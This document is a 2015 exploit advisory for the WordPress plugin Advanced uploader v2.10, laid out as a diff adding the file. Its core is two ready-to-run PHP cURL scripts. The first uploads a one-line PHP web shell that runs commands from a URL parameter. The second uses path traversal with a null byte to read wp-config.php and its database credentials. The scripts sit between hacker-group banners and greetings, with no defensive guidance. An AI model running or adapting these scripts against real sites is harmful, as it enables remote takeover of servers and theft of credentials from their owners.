@@ -1,0 +1,88 @@
+###########################################
+#-----------------------------------------#
+#[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]#
+#-----------------------------------------#
+#     *----------------------------*      #
+#  K  |....##...##..####...####....|  .   #
+#  h  |....#...#........#..#...#...|  A   #
+#  a  |....#..#.........#..#....#..|  N   #
+#  l  |....###........##...#.....#.|  S   #
+#  E  |....#.#..........#..#....#..|  e   #
+#  D  |....#..#.........#..#...#...|  u   #
+#  .  |....##..##...####...####....|  r   #
+#     *----------------------------*      #
+#-----------------------------------------#
+#[ Copyright (c) 2015 | Dz Offenders Cr3w]#
+#-----------------------------------------#
+###########################################
+# >>    D_x . Made In Algeria . x_Z    << #
+###########################################
+#
+# [>] Title : Wordpress Plugin Advanced uploader v2.10 Multiple Vulnerabilities
+#
+# [>] Author : KedAns-Dz
+# [+] E-mail : ked-h (@hotmail.com)
+# [+] FaCeb0ok : fb.me/K3d.Dz
+# [+] TwiTter : @kedans
+#
+# [#] Platform : PHP / WebApp
+# [+] Cat/Tag : File Upload / Code Exec / Disclosure
+#
+# [<] <3 <3 Greetings t0 Palestine <3 <3
+# [!] Vendor : http://www.wordpress.org
+#
+###########################################
+#
+# [!] Description :
+#
+# Wordpress plugin Advanced uploader v2.10 is suffer from multiple vulnerabilities
+# remote attacker can upload file/shell/backdoor and exec commands or disclosure some local files.
+#
+####
+
+<?php
+// page : upload.php
+// lines : 1030... 1037
+
+$postData = array();
+$postData['file'] = "@k3d.php";
+/* k3d.php : <?php system($_GET["dz"]); ?> */
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http:/[target].com/wp-content/plugins/advanced-uploader/upload.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postData );
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+?>
+
+##################
+
+<?php
+// page : upload.php
+// lines : 1219... 1237
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://$[target].com/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00");
+curl_setopt($ch, CURLOPT_HTTPGET, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+?>
+
+####
+#  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !>
+#  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3
+#---------------------------------------------------------------
+# Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 , 
+# Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic,
+# & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , &
+# & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , &
+# & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, &
+# & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day & 
+# PacketStormSecurity * Metasploit * OWASP * OSVDB * CVE Mitre ;
+####
